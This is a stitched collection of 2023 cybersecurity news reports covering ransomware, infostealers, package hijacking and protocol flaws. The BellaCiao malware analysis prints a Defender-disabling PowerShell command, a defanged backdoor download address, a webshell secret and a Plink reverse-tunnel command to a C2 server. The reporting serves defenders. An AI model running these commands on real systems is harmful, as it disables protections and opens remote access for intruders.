      "text": " A major vulnerability in the software used by gene sequencers produced by genetic-research equipment maker Illumina highlights the dangers of software vulnerabilities in medical devices, but also demonstrates the positive impact of legislation in strengthening cybersecurity in the medical field.The vulnerability, originally discovered during an internal Illumina assessment, allows an unauthenticated attacker to exploit the system and execute code at the operating system level, according to an advisory published by the Cybersecurity and Infrastructure Security Agency (CISA). The vulnerability — and a second less serious flaw — raise the possibility of attackers specifically targeting medical research facilities and forensics laboratories.While the cybersecurity of medical devices is critical, security issues in DNA sequencing and synthesis equipment pose specific risks, says Josh Corman, vice president of cyber safety strategy at Claroty, a cyber-physical security provider, and a former chief strategist with CISA.\"Anything that touches DNA — yes, it's a privacy concern — but also think about digital forensics or think about custom cancer treatments, right?\" he says. \"If you could taint evidence for a crime, if you could mess with someone's treatment, if you cast doubt on a particular device manufacturer — this is an integrity attack to me, not so much just attacking the availability of the device or using it as a jumping off point for ransomware.\"Both the Food and Drug Administration (FDA) and CISA are doing more to focus medical device-makers on cybersecurity. The FDA issued a letter to healthcare providers on April 27 advising them of the vulnerabilities and that Illumina had issued a patch for their products and worked with the FDA and CISA to communicate information to its users.The obvious threat for an organization with these devices is that the devices could be used as a beachhead into a network, allowing the compromise of lab equipment and computers on the same network. Because that equipment is often not managed by the organizations' IT security groups, an attacker may be able to have a greater impact.In addition, the fact that these devices also handle sensitive DNA data adds a twist, Mohammad Waqas, principal solutions architect for healthcare at Armis, a provider of cybersecurity for the extended attack surface.\"Healthcare is seen as an easy target for cyberattacks due to historically low investments in IT security and the mission-critical nature of the data and systems,\" he says. \"Genomic sequencing devices, in particular, process protected health information, which is high value data for hackers.\"Both CISA and Illumina have stated that the organizations have seen no evidence of exploitation, and an Illumina spokesperson stressed that the company had taken all the appropriate steps, from discovering the vulnerability internally to issuing a patch to notifying the FDA.\"We provided specific instructions to each customer, along with the recommendation that the actions be performed on all impacted systems, regardless of whether the instruments are connected to the Internet or a local network,\" an Illumina spokesperson tells Dark Reading. \"We ensured the patch created little to no downtime and provided access to our Tech Support team throughout the entire process.\"While the cybersecurity of any medical device is critical, devices that deal with human DNA — such as sequencers and synthesizers — can add a few new wrinkles to the threat models, says Claroty's Corman.\"Medical-device manufacturers are starting to understand that the threat model is not just about who could steal DNA information from America, but ... understanding there's integrity risks as to the results, and there's potential for tampering,\" he says. \"Just think of any ethics conversations you've heard around CRISPR or DNA sequencing or privacy, ... and then think [if you could] manipulate individual or large swaths of results coming out of these devices.\"In addition, Armis' Waqas says that healthcare organizations need to focus on risks, addressing asset visibility, cross-team collaboration, and risk remediation.Copyright © 2023 Informa PLC Informa UK Limited is a company registered in England and Wales with company number 1072954 whose registered office is 5 Howick Place, London, SW1P 1WG."

      "text": " Facebook discovered a new information-stealing malware distributed on Meta called 'NodeStealer,' allowing threat actors to steal browser cookies to hijack accounts on the platform, as well as Gmail and Outlook accounts.Capturing cookies that contain valid user session tokens is a tactic that is growing in popularity among cybercriminals, as it allows them to hijack accounts without having to steal credentials or interact with the target while also bypassing two-factor authentication protections.Facebook's engineers first spotted the NodeStealer malware in late January 2023, attributing the attacks to Vietnamese threat actors.The malware is called NodeStealer, as it is written in JavaScript and executed through Node.js.Node.js makes the malware capable of running on Windows, macOS, and Linux, and it is also the source of its stealthiness, with almost all AV engines on VirusTotal failing to mark it as malicious at the time.NodeStealer is distributed as a 46-51MB Windows executable disguised to appear as a PDF or Excel document appropriately named to incur curiosity to the recipient.Upon launch, it uses Node.js' auto-launch module and adds a new registry key to establish persistence on the victim's machine between reboots.The malware's primary goal is to steal cookies and account credentials for Facebook, Gmail, and Outlook, stored in Chromium-based web browsers like Google Chrome, Microsoft Edge, Brave, Opera, etc.This data is normally encrypted on the browsers' SQLite database; however, reversing this encryption is a trivial process implemented by all modern information stealers, who simply retrieve the base64-encoded decryption key from the Chromium \"Local State\" file.If NodeStealer finds cookies or credentials related to Facebook accounts, it enters the next phase, \"account reconnaissance,\" during which it abuses Facebook API to extract information about the breached account.To evade detection by Facebook's anti-abuse systems, NodeStealer hides these requests behind the victim's IP address and uses their cookie values and system configuration to appear like a genuine user.The key information the malware goes after is the Facebook account's ability to run advertising campaigns, which threat actors leverage for pushing misinformation or leading unsuspecting audiences to other malware distribution sites.Having stolen all that info, NodeStealer exfiltrates the stolen data to the attacker's server.Upon discovery, Facebook reported the threat actor's server to the domain registrar, and it was taken down on January 25, 2023."

      "title": "Researcher hijacks popular Packagist PHP packages to get a job",
      "text": " A researcher hijacked over a dozen Packagist packages—with some having been installed hundreds of millions of times over the course of their lifetime.The researcher reached out to BleepingComputer stating that by hijacking these packages he hopes to get a job. And, he seems pretty confident that this would work.Yesterday, a researcher with the pseudonym 'neskafe3v1' reached out to BleepingComputer stating he had taken over fourteen Packagist packages, with one of them having over 500 million installs.Packagist is the primary registry of PHP packages that are installable via Composer, a dependency management tool. Rather than hosting these packages though, Packagist serves more as a metadata directory that aggregates open source packages published to GitHub. These packages can then be installed by developers on their machines by running the composer install command.The names of the hijacked packages include:The researcher provided proof to BleepingComputer demonstrating that on Monday, May 1, the Packagist pages for these packages were modified to point to the researcher's (fake) repo, as opposed to the legitimate GitHub repository for each package.These changes have now been reverted by the Packagist team as checked by BleepingComputer.Publishing process on Packagist is a bit different from that on open source repos like npm or PyPI. A developer, as opposed to uploading binaries or software releases directly to Packagist.org, simply creates a Packagist.org account, and \"submits\" a link to their GitHub repo for a particular package. Packagist's crawler then visits the provided repo and aggregates all the data to display on the Packagist page for that package.This is in stark contrast to how npm or PyPI works—that is, these registries host and distribute software releases directly from their servers.By modifying the Packagist page for each of these packages, the researcher effectively hijacked the installation workflow used within Composer environments. Developers would now get the contents of a package from neskafe3v1's GitHub repo, rather than the project's repository.To keep the demonstration to a minimum, the researcher simply changed the composer.json file—something akin to an application manifest, within these packages to read:\"Pwned by neskafe3v1.... Ищу работу на позиции Application Security, Penetration Tester, Cyber Security Specialist.\"He did so by forking the original project repository, modifying the \"description\" field within composer.json, and committing the change to his forked repository. At no point did he merge the changes back into the original repository (doing so would have required additional access and possibly invited scrutiny of maintainers).Instead, the researcher apparently gained access to the maintainers' Packagist accounts and changed the GitHub URLs to the listed packags to that of his forked repos. But, he did not reveal the exact method used for hijacking to BleepingComputer.\"As you can see, I'm looking for a job (that message 'Ищу работу на позиции...' means 'I'm looking for a job...'), so I will disclose a report after I will be hired by some company,\" the researcher told BleepingComputer, likening the entire hijacking campaign to \"an advertisement of myself as an employee.\"\"Until there is success, there is nothing to talk about.\"In a statement to BleepingComputer, the Packagist team said that no malicious impact had been observed thus far on the platform as a result of this action while confirming the takeover indeed resulted from credentials compromise of maintainer accounts.\"To our knowledge this has not been used for any malicious purposes and was limited to a few old accounts with insecure passwords and missing 2 factor authentication,\" Nils Aderman of Packagist.org, who is also one of the original Composer developers, told BleepingComputer.\"All four accounts appear to have been using shared passwords leaked in previous incidents on other platforms. Please, do not reuse passwords,\" warn Packagist admins.Working alongside Marco Pivetta aka Ocramius, Packagist admins promptly identified all accessed accounts, disabled access to them and restored the GitHub URLs to their former values. The restoration effort was completed by Tuesday morning.The researcher additionally told BleepingComputer that he had not abused the technique to distribute malware, but at the same time, said he had not notified either Packagist or the package owners of the little experiment—which raises eyebrows with regards to the 'ethical' nature of this research.\"The only thing I did - I altered 'description' field in composer.json files,\" said the researcher pointing us to proofs such as Git commits.In their blog post, Packagist admins request that researchers report bugs and vulnerabilties in a responsible manner.\"You can reach us at security@packagist.org and we reply promptly to all requests or reports. We of course provide credit and publish details of reported vulnerabilities...\""

Its customers include major chains such as the Wyndham Group, Radisson Hotels, Accor Hotels, Marriott, and IHG.Attackers who exploit the software can potentially gain access to personally identifiable information, credit card data, and other sensitive information belonging to guests. CVE-2023-21932 exists in version 5.6 of the Opera 5 Property Services platform.Oracle said the vulnerability allows attackers who exploit it to reach to all data in which Opera 5 Property Services has access. It also would let attackers update, insert, or delete access to at least some of the data in the system.Shah, a bug hunter on the HackerOne platform, discovered the vulnerability while conducting a source-code analysis of Opera in collaboration with Sean Yeoh, engineering lead at Assetnote, Brendan Scarvell, a pen tester with PwC Australia, and Jason Haddix, CISO at adversary emulation company BuddoBot.Shah and the other researchers identified CVE-2023-21932 as having to do with an Opera code segment sanitizing an encrypted payload for two specific variables, and then decrypting it, instead of doing it the other way around. This type of an \"order of operations\" bug gives attackers a way to sneak in any payload via the variables without any sanitization happening, the researchers said.\"We were able to leverage this bug to gain access to one of the biggest resorts in the US, for a live hacking event.\"The researchers outlined the steps they took to overcome specific controls in Opera to achieve pre-authentication execution, noting that none of them required any kind of special access or knowledge of the software.\"All steps performed in the exploitation of this vulnerability were without any authentication,\" they wrote. They claimed Oracle took almost a full year to release the bug after being notified about it.According to Shah and the other researchers, CVE-2023-21932 is just one of many flaws in Oracle Opera — at least some of which the company has not addressed. \"Please do not expose this to the Internet, ever,\" they wrote.Copyright © 2023 Informa PLC Informa UK Limited is a company registered in England and Wales with company number 1072954 whose registered office is 5 Howick Place, London, SW1P 1WG."

      "text": " North Korean state advanced persistent threats (APTs) are evolving: developing new payloads; modifying their tactics, techniques, and procedures (TTPs); and targeting new sectors and individuals without bias — even if those individuals themselves happen to be North Koreans.Meanwhile, Southeast Asia \"has been a key area of development,\" says David Emm, senior security researcher at Kaspersky, \"and it doesn't show any signs of slowing down any time soon.\"More recently, in a campaign that ended this January, the group weaponized a backdoored client for the open source remote administration tool UltraVNC. Its zombified UltraVNC might have seemed to operate normally on the surface, while it covertly exfiltrated data about the host computer and downloaded to it a brand-new version of BlindincanBlindincan is a remote access Trojan that enables Lazarus to read, write, and delete files (among other things), retrieve information about a host's OS and disks, and more. The newest version introduced plug-ins to expand upon the original's functionality.Analysis of the January 2023 campaign suggested that Blindincan was deployed against organizations in the manufacturing and real estate sectors in India and telecommunications companies in Pakistan and Bulgaria.After obtaining access to data from the attackers' command-and-control C2 servers, the researchers found a wealth of stolen information not from foreign targets, but domestic ones — and not just domestic targets but individuals: novelists, students, and businesspeople from North Korea itself.Being one person against the might of a nation-state APT is a tricky position to be in, Emm acknowledges, but it's not as uncommon as it sounds.\"You know, often when an APT goes after organizations, they will actually go after individuals,\" he points out. Hackers often target low-level employees with access to broader IT infrastructure in a large enterprise, or they go directly for the throat: spear-phishing a high-level executive or administrator with privileged access to sensitive documents or systems.\"For organizations and individuals, the key is to decide if you are in that category — that you may be a person of interest,\" he says. \"Then, you really need to think above and beyond. Being able to detect suspicious activity, and taking great care over the data that you're holding onto, needs to be over and above what maybe an ordinary individual would do.\"Copyright © 2023 Informa PLC Informa UK Limited is a company registered in England and Wales with company number 1072954 whose registered office is 5 Howick Place, London, SW1P 1WG."

      "title": "Attacks on PaperCut servers tied to Clop, LockBit ransomware groups | SC Media",
      "text": "  Microsoft on Wednesday alleged that the recent attacks on the popular PaperCut servers are tied to the Clop and LockBit ransomware groups, which use critical and high severity vulnerabilities in PaperCut’s NG/MF print management products to steal sensitive corporate data.According to Microsoft, Lace Tempest runs as a Clop ransomware affiliate that has been observed using GoAnywhere exploits and Raspberry Robin infection hand-offs in past ransomware campaigns. The threat actor incorporated the PaperCut exploits into their attacks as early as April 13. In observed attacks, Microsoft said Lace Tempest ran multiple PowerShell commands to deliver a TrueBot DLL, which connected to a C2 server, attempted to steal LSASS credentials, and injected the TrueBot payload into the conhost.exe service. While Microsoft’s attribution to Lace Tempest adds an interesting wrinkle, the more interesting piece of this puzzle is the timeline of exploitation of this issue by the threat actors, said Zach Hanley, chief attack engineer at Horizon3.ai. Hanley said PaperCut and the Zero Day Initiative published the vulnerability descriptions in mid-March. By mid-April the threat actors had developed a working exploit for the described issue and were conducting mass ransomware campaigns for all internet exposed servers — well before any public exploit was available.“This may indicate the threat actors are actively monitoring sources of vulnerability threat intelligence like Zero Day Initiative’s ‘Upcoming Advisories,’ which list affected vendors before a patch becomes available and official CVE’s are created,” said Hanley. “The threat actors are seemingly investing in targeted vulnerability research when a vulnerability affects enough internet-facing devices to be the precursor to their ransomware campaigns. This continuous threat-intelligence loop will play an increasingly important role in organizations security models as threat actors become more efficient at it.”Heath Renfrow, co-founder at Fenix24, added that Clop functions as a very active, organized ransomware-as-a-service (RaaS) operation with connections to other criminal gangs, and their affiliates have been making news a lot recently by exploiting unpatched vulnerabilities, such as the recent GoAnywhere attacks. Renfrow said they are also seeing a lot of Clop cases in their ransomware remediation practice, adding that Clop actors prefer extortion over strictly encryption-based attacks, and these PaperCut incidents are ripe for exploitation for Clop because of the data available for exfiltration.“They find any vulnerability they can use as a wedge to steal data and extort the organization,” said Renfrow. “LockBit is also getting into the game on this vulnerability, though they are more focused on encryption for ransom.Renfrow said the PaperCut case is a good example of securing any network-connected device and cannot be written off as a \"lesser threat\" to the enterprise; and that it's essential to watch threat feeds for critical vulnerabilities and patch quickly.\"Printers can store and save very mission-sensitive data — anything from M&A documents to HR documentation — and they also enable entry to the network in general, and that makes PaperCut vulnerabilities significant,\" he concluded.After admitting responsibility for compromising Sony, a Colonial Pipeline supplier, and a Hawai'i government site, the RansomedVC group has claimed that it will be ending operations due to the arrests of six of its affiliates, reports The Record, a news site by cybersecurity firm Recorded Future.U.S. advanced electronic components manufacturer Kyocera AVX Components Corporation has disclosed that 39,111 individuals around the world had their data compromised following a ransomware attack earlier this year, which has been claimed by the LockBit ransomware operation, reports BleepingComputer.Attack on the U.S. subsidiary of the Industrial & Commercial Bank of China disrupted Treasury trading in New York earlier this week.

Apparently, this feature is designed to help users to keep up with their favorite content creators on YouTube whenever a new video is posted. However, the malfunction is causing the feature to send every URL or domain that the user visits to Bing API endpoints.The Redditor hackermchackface wrote:What is causing Edge to leak all visited URLs following latest update? API is: bingapis.com/api/v7/followweb/isfollowable ?GET request includes full url of every page navigate to.Searching for References to this url give very few results, no documentation on this feature at all. Json response shows type as “FollowableStatus” which yields zero Google results, which is rare.Surely I can’t be the first to discover this?!While Reddit users were unable to find out why Microsoft Edge is sending URLs to its Bing API servers, Microsoft MVP and Stardock engineer Rafael Rivera provided the following statement to The Verge:Microsoft Edge now has a creator follow feature that is enabled by default, it appears the intent was to notify Bing when you’re on certain pages, such as YouTube, The Verge, and Reddit. But it doesn’t appear to be working correctly, instead sending nearly every domain you visit to BingMicrosoft is investigating the problem and working on a solution. Caitlin Roulston, Director of Communications at Microsoft confirmed that the company is aware of such reports and it would take appropriate action to address any issues.While Microsoft has not offered a solution on how to stop it from happening, it is strongly recommended to turn off the “follow creators” feature in Microsoft Edge to prevent any potential privacy violations.You can disable the “follow creators” feature by following the below steps:Keep watching this space for more updates, as this is a developing story!"

      "text": " SAN FRANCISCO — A senior Department of Homeland Security official confirmed Wednesday that DHS is working with Congress and the White House on a bill that would codify the Cyber Safety Review Board (CSRB) — a brand-new effort for examining significant cybersecurity incidents.DHS wants legislation that would formally authorize the board’s funding and grant it subpoena power to compel victims to speak honestly, said Rob Silvers, the undersecretary for strategy, policy and plans, at the RSA Conference.“We think it would really be in rare instances where the board would need to use that,” Silvers said about the subpoena power, comparing it to the National Transportation Safety Board’s authorities during accident investigations.The NTSB “almost never uses it, because it doesn't need to, because it gets a cooperation,” Silvers said.So far the board has seen trust and buy-in from the cybersecurity community, Silvers said, noting that both Apache — the organization that manages the Log4j software — and representatives of the Chinese government appeared before the board for the first investigation.But subpoena power would give the CSRB the “power we need to get the information we need to do this important work,” Silvers said.DHS Secretary Alejandro Mayorkas has mentioned the need for Congress to codify the CSRB several times during testimony during various committees.Much of the proposed legislation also outlines the extensive measures that would be taken to protect the information provided to the board during investigations.Heather Adkins, the co-chair of the CSRB and Google’s vice president of security engineering, said onstage with Silvers that members are already making changes to how the board operates after the first investigation and are mulling several others.“We've already made process changes behind the scenes to get more efficient, to be able to do bigger things. And so I also will want to reach out to the community because I think that will inform us on how can we be better helping the community? Is it more reviews? Fewer reviews? Bigger reviews?” she said.“That way we know what we're needing for the next version. And then it'd be resilient and permanent and part of the ecosystem in such a way that once we examine all of our current problems, we can solve the next generation of problems as well.”Jonathan Greig is a Breaking News Reporter at Recorded Future News.

It particularly focused on the USA, Canada, England and Australia.“This threat actor is creating new business profiles, as well as hijacking real, reputable profiles with even millions of followers,” Tal explained.They also repeatedly posted malicious clickbait on Facebook feeds promising adult-rated photo album downloads for free.The executable then opens a browser window popup with a decoy website showing related content.“While in the background, the stealer will silently deploy, execute and gain persistence to periodically exfiltrate your sessions cookies, accounts, crypto-wallets and more.”Tal clarified that the team observed several variations of the latest payload, yet all shared a benign executable file to start the infection flow.“The malicious payload is quite sophisticated and varies all the time, introducing new evasive techniques,” the security expert wrote.“As we’ve seen, it takes time for security vendors to fingerprint it and create relevant verdicts to block — especially when it’s done out of context.”Editorial image credit: BigTunaOnline / Shutterstock.com"

      "text": " RTM Locker is the latest enterprise-targeting ransomware operation found to be deploying a Linux encryptor that targets virtual machines on VMware ESXi servers.\"The business-like set up of the group, where affiliates are required to remain active or notify the gang of their leave, shows the organizational maturity of the group, as has also been observed in other groups, such as Conti.\"Security researcher MalwareHunterTeam also shared a sample of RTM Locker with BleepingComputer in December 2022, indicating this RaaS has been active for at least five months.At the time, Trellix and MalwareHunterTeam had only seen a Windows ransomware encryptor, but as Uptycs reported yesterday, RTM has expanded its targeting to Linux and VMware ESXi servers.Over the past years, the enterprise has moved to virtual machines (VMs) as they offer improved device management and much more efficient resource handling. Due to this, an organization's servers are commonly spread over a mix of dedicated devices and VMware ESXi servers running multiple virtual servers.Ransomware operations have followed this trend and created Linux encryptors dedicated to targeting ESXi servers to encrypt all data used by the enterprise properly.The RTM Locker Linux encryptor appears to be created explicitly for attacking VMware ESXi systems, as it contains numerous references to commands used to manage virtual machines.When launched, the encryptor will first attempt to encrypt all VMware ESXi virtual machines by first gathering a list of running VMs using the following esxcli command:The encryptor then terminates all running virtual machines using the following command:After all the VMs are terminated, the encryptor begins to encrypt files that have the following file extensions - .log (log files), .vmdk (virtual disks), .vmem (virtual machine memory), .vswp (swap files), and .vmsn (VM snapshots).All of these files are associated with virtual machines running on VMware ESXi.Like Babuk, RTM uses a random number generation and ECDH on Curve25519 for asymmetric encryption, but instead of Sosemanuk, it relies on ChaCha20 for symmetric encryption.The result is secure and hasn't been cracked yet, so there are no available free decryptors for RTM Locker at this time.Uptycs also comments that the cryptographic algorithms are \"statically implemented\" into the binary's code, making the encryption process more reliable. When encrypting files, the encryptor appends the .RTM file extension to encrypted file's names, and after it's done, creates ransom notes named !!! Warning !!! on the infected system.The notes threaten to contact RTM's \"support\" within 48 hours via Tox to negotiate a ransom payment, or the victim's stolen data will be published.In the past, RTM Locker used payment negotiation sites on the following TOR sites but moved to TOX recently for communications.The existence of an ESXi-targeting version is enough to categorize RTM Locker as a significant threat to the enterprise.However, the good news is that BleepingComputer's research has shown that the group is not particularly active, though that may change in the future."

      "title": "Unpacking BellaCiao: A Closer Look at Iran’s Latest Malware",
      "text": " \n         April 26, 2023\n      The name used by malware developers is BellaCiao, a reference to the Italian folk song about resistance fighting. We have identified multiple victims in the United States and Europe, but also in the Middle East (Turkey) or India. In a speech on 17 March 2021, Ebrahim Raisi (then chief justice of Iran) declared: “The Islamic Revolutionary Guard Corps has excelled in every field it has entered both internationally and domestically, including security, defense, service provision and construction.” In August 2021, Raisi replaced more moderate candidate Hassan Rouhani as the president of Iran. Starting only one month after his inauguration, cyberattacks attributed to IRGC threat actors started increasing in scope, scale, and sophistication. Quick weaponization of publicly disclosed PoCs is the “new” winning formula for both financially motivated and state-sponsored threat actors: Fig 1 – An example flow of hybrid attack  One crucial aspect of this emerging attack method is that there can be a significant time gap between the automated and manual phases. For instance, when initial access brokers are involved, a compromised server with a webshell may remain dormant until an interested buyer is found, and the transaction is completed. Alternatively, threat actors may compromise more servers than they can handle, creating a backlog of compromised networks. Threat actors with lower levels of sophistication can exploit the absence of advanced detection capabilities like EDR, XDR, or MDR on compromised networks, making this tactic highly effective until such tools become more widely adopted. More sophisticated threat actors, including Charming Kitten, are trying to stay ahead of defenders by using custom tools to evade detection. Custom-developed malware, also known as “tailored” malware, is generally harder to detect because it is specifically crafted to evade detection and contains unique code.  During our investigation, we have located multiple BellaCiao samples. Each sample collected was tied up to a specific victim and included hardcoded information such as company name, specially crafted subdomains, or associated public IP address. Because all binaries are highly customized and can reveal information about victims, we are not including information such as MD5 or SHA256 hashes in this report. All samples that we collected included .pdb paths. PDB (Program DataBase) is a file format used by Microsoft Visual Studio for storing debugging information about an executable or DLL file. We used it to extract build information of project, including the project name and path that was configured in Visual Studio. Z:\\BellaCiao\\BellaCiao\\More Targets\\<Country>\\<Public IP>\\<Hostname>\\backdoor\\MicrosoftAgentServices\\MicrosoftAgentServices\\obj\\Release\\Using information from these files, we can learn that victims were organized in different folders by country, using folder names like IL(Israel), TR(Turkey), AT(Austria), IN(India) or IT(Italy). The original developer named this project BellaCiao, a reference to an Italian folk song that is an anthem of resistance and freedom. It is possible that the use of the name \"BellaCiao\" by Iranian hackers can be a symbolic reference to their perceived struggle against the world, but this is speculative and there is no concrete evidence to support this theory. Ultimately, the true reasons behind the choice of this name may only be known to the individuals or group responsible for the malware. Information about <Public IP> and <Hostname> are relevant for communication with C2 infrastructure, we will describe this process later. Upon deployment, BellaCiao immediately attempts to disable Microsoft Defender using the following PowerShell command: powershell.exe -exec bypass -c Set-MpPreference -DisableRealtimeMonitoring $trueA new service instance is created to establish persistence. Legitimate process names specific to Microsoft Exchange server were used to blend in, a common technique known as masquerading. Threat actors also attempted to download two IIS backdoors from http://188.165.174[.]199:18080. The BellaCiao executable is written to one of the following locations: These executables run as a service (e.g. “Microsoft Exchange Services Health”). The BellaCiao is a dropper malware – it is designed to deliver other malware payloads onto a victim’s computer system, based on instructions from C2 server. The payload delivered by BellaCiao is not downloaded but hardcoded into the executable as malformed base64 strings and dumped when requested. To receive instructions from C2 server, BellaCiao is using unique approach of domain name resolution and parsing of the returned IP address.  A DNS request is performed every 24 hours to resolve a subdomain (hardcoded string unique for each victim) using the following pattern: <2 random uppercase letters><3 random lowercase letters><victim specific subdomain>.<C2 domain>The executable code of BellaCiao compares a resolved IP address returned by a DNS server under the control of a threat actor with an IP address that has been hardcoded into the program. The resolved IP address is like the real public IP address, but with slight modifications that allow BellaCiao to receive further instructions. It's important to note that BellaCiao only operates with two fixed values - a hardcoded IP string (“local” IP, we will use L1.L2.L3.L4 for examples) and the IP address returned by the DNS server controlled by the threat actor (“remote” IP - R1.R2.R3.R4). The code does not contain the actual IP address; rather, it mimics its format to give the impression that the DNS requests are valid. When comparing these two IP addresses, there are three potential scenarios, depending on the last octet of an IP address: After receiving instructions to deploy webshell (local IP equals resolved IP), other octets (segments of IP address) are parsed to identify the folder and filename to use. Below is the list of octets and which aspect of webshell deployment they impact: If we use a Google Public DNS server address (8.8.8.8) as an example, here are few deployment scenarios (depending on resolved IP address): The dropped .aspx webshell supports 3 operations: The User-Agent string must start with a secret code (ruby@123!) to make sure that the request is coming from threat actors, followed by requested operation. We have also analyzed the second variant of BellaCiao that contains different payload. This second variant drops the Plink tool and PowerShell script hardcoded locations. The PowerShell scripts executes the Plink tool for establishing a reverse proxy connection to the C2 to enable interaction with the PowerShell web server: <Plink> <C2 domain> -P 443 -C -R 127.0.0.1:49700:127.0.0.1:49700 -l <User> -pw <Password>”;PowerShell web server implements the following operations: We would like to thank Adrian Schipor, Victor Vrabie, Cristina Vatamanu, and Alexandru Maximciuc for help with putting this advisory report together.  An up-to-date and complete list of indicators of compromise is available to Bitdefender Advanced Threat Intelligence users.

      "text": " ​Microsoft has attributed recent attacks on PaperCut servers to the Clop and LockBit ransomware operations, which used the vulnerabilities to steal corporate data.Last month, two vulnerabilities were fixed in the PaperCut Application Server that allows remote attackers to perform unauthenticated remote code execution and information disclosure:Today, Microsoft disclosed that the Clop and LockBit ransomware gangs are behind these PaperCut attacks and using them to steal corporate data from vulnerable servers.PaperCut is a printing management software compatible with all major printer brands and platforms. It is used by large companies, state organizations, and education institutes, with the company's website claiming it is used by hundreds of millions of people from over 100 countries.In a series of tweets posted Wednesday afternoon, Microsoft states that it has attributed the recent PaperCut attacks to the Clop ransomware gang.Microsoft tracks this particular threat actor as 'Lace Tempest,' whose activity overlaps with FIN11 and TA505, both linked to the Clop ransomware operation.Microsoft says that the threat actor has been exploiting the PaperCut vulnerabilities since April 13th for initial access to the corporate network.Ultimately, Microsoft says a Cobalt Strike beacon was deployed and used to spread laterally through the network while stealing data using the MegaSync file-sharing application. In addition to Clop, Microsoft says some intrusions have led to LockBit ransomware attacks. However, it's unclear if these attacks began after the exploits were publicly released.Microsoft recommends admins apply the available patches as soon as possible as other threat actors will likely begin exploiting the vulnerabilities.The exploitation of PaperCut servers fits a general pattern we have seen with the Clop ransomware gang over the past three years.While the Clop operation still encrypts files in attacks, they have told BleepingComputer that they prefer to steal data to extort companies into paying a ransom.All organizations utilizing PaperCut MF or NG are strongly advised to upgrade to versions 20.1.7, 21.2.11, and 22.0.9 immediately and later to fix these vulnerabilities.Update 4/27/28: The Clop ransomware operation confirmed to BleepingComputer that they were behind the attacks on PaperCut servers, which they started exploiting on April 13th.However, they said that they used the vulnerabilities for initial access to networks, rather than to steal documents from the server itself.In reply to our questions about the LockBit attacks, Microsoft said they had nothing further to share."

      "title": "Google will add End-to-End encryption to Google Authenticator",
      "text": " Google is bringing end-to-end encryption to Google Authenticator cloud backups after researchers warned users against synchronizing 2FA codes with their Google accounts.This new feature allows users to synchronize their Google Authenticator 2FA tokens with their Google account, providing a backup if their mobile device is lost or damaged.It also allows users to access their 2FA tokens on multiple devices as long as they are all logged into the same Google account.However, soon after Google Authenticator cloud sync was announced, security researchers at Mysk discovered that the data was not being end-to-end encrypted while being uploaded to Google’s servers.\"As shown in the screenshots, this means that Google can see the secrets, likely even while they’re stored on their servers. There is no option to add a passphrase to protect the secrets, to make them accessible only by the user.\"End-to-End encryption is when data is encrypted on a device using a password only known to the owner before it is transmitted and stored on another device. As this data is encrypted, it can no longer be accessed by anyone else, even those with access to the server the data is stored on.As Google Authenticator does not offer end-to-end encryption, the data is stored on Google's server in a format that unauthorized users could potentially access, whether through a Google breach or an unscrupulous employee.\"Every 2FA QR code contains a secret, or a seed, that’s used to generate the one-time codes. If someone else knows the secret, they can generate the same one-time codes and defeat 2FA protections,\" continued Mysk.\"So, if there’s ever a data breach or if someone obtains access to your Google Account, all of your 2FA secrets would be compromised.\"Authy, another popular authenticator app, has grown in popularity over the years as it offers cloud backups of 2FA tokens that are end-to-end encrypted.When using this feature on Authy, users must enter a password only they know, causing any uploaded data to be encrypted before it leaves their mobile device.Furthermore, Authy does not allow data to be backed up unless an end-to-end encryption password is set, providing better security.However, this feature poses a risk, since users could be locked out of their data and unable to restore it to another device if they lose the password.Google has heard users' concerns about the lack of end-to-end encryption and said they would add it to a future version of Google Authenticator.Google Group Product Manager Christiaan Brand told BleepingComputer that due to the possibility of end-to-end encryption causing users to get locked out of their own data, they are rolling out this feature carefully in their products.“The security and safety of our users is paramount to everything we do at Google, and it’s a responsibility we take seriously. The recent update to the Google Authenticator app was done with that mission in mind and we took careful steps to ensure we were able to offer it to users in a way that protects their security and privacy, but is also useful and convenient,” Brand told BleepingComputer.\"We encrypt data in transit, and at rest, across our products, including in Google Authenticator. End-to-End Encryption (E2EE) is a powerful feature that provides extra protections, but at the cost of enabling users to get locked out of their own data without recovery. To ensure that we're offering a full set of options for users, we have also begun rolling out optional E2EE in some of our products, and we plan to offer E2EE for Google Authenticator in the future.\""

      "title": "High-Severity SLP Flaw Can Amplify DDoS Attacks up to 2,200 Times",
      "text": " The flaw, tracked as CVE-2023-29552, is found in the Service Location Protocol (SLP), a largely outdated network-discovery protocol that is still used by some routers, virtual machines, printers, and other technology.\"CVE-2023-29552 is a threat that can potentially impact business continuity and result in financial loss, even if an attacker has limited resources,\" he warned.In a reflective amplification DDoS attack, a threat actor typically sends small requests to a server with a spoofed source IP address that corresponds to the victim's IP address, garnering responses to that address that are much larger than the requests, the researchers explained. This generates large amounts of traffic to the victim's system, they said.\"The attacker is simply tricking systems on the Internet — not necessarily owned by the target — to send mass amounts of traffic to the target,\" Stone wrote in the post.Despite this, in February 2023, Bitsight and Curesec researchers identified more than 2,000 global organizations and more than 54,000 SLP instances — including VMware ESXi Hypervisor, Konica Minolta printers, Planex Routers, IBM Integrated Management Module (IMM), and Supermicro IPMI — that attackers potentially can abuse to launch DoS attacks on global organizations, they said.Moreover, the researchers identified a number of Fortune 1,000 organizations as having instances vulnerable to the SLP flaw, with the US the top nation affected by the potential risk, followed by the United Kingdom, Japan, Germany, Canada, France, Italy, Brazil, the Netherlands, and Spain.\"VMware recommends that the best option to address CVE-2023-29552 is to upgrade to a supported release line that is not impacted by the vulnerability,\" the company said. This would include any 7.x or 8.x version of ESXi, according to VMware.\"ESXi 7.0 U2c and newer, and ESXi 8.0 GA and newer, ship with the SLP service hardened, disabled by default, and filtered by the ESXi firewall,\" the company said.A reflective amplification DDoS attack that exploits CVE-2023-29552 would use reflection coupled with service registration to significantly amplify the amount of traffic sent to the victim, the Bitsight and Curesec researchers explained.The typical reply packet size from an SLP server is between 48 and 350 bytes, they said. If you take a 29-byte request, the amplification factor — or the ratio of reply to request magnitudes — would roughly be between 1.6X and 12X.However, since SLP does not require authentication, it allows an unauthenticated user to register arbitrary new services, the researchers said. This means that an attacker can manipulate both the content and the size of the server reply. The end result is a maximum amplification factor of more than 2,200 times |\"due to the roughly 65,000-byte response given a 29-byte request,\" Stone wrote.\"This extremely high amplification factor allows for an under-resourced threat actor to have a significant impact on a targeted network and/or server via a reflective DoS amplification attack,\" he wrote.Indeed, given the criticality of the vulnerability and the potential consequences resulting from exploitation of the SLP flaw, Bitsight and Curesec researchers coordinated public disclosure efforts with the US Department of Homeland Security’s Cybersecurity and Infrastructure Security Agency (CISA), as well as affected 